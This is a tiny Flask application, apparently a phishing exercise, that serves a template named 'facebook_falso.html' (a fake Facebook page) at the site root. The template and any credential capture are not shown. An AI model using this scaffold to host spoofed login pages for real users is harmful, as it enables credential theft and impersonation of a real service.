from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def pagina_inicial():
    return render_template("facebook_falso.html")

app.run()
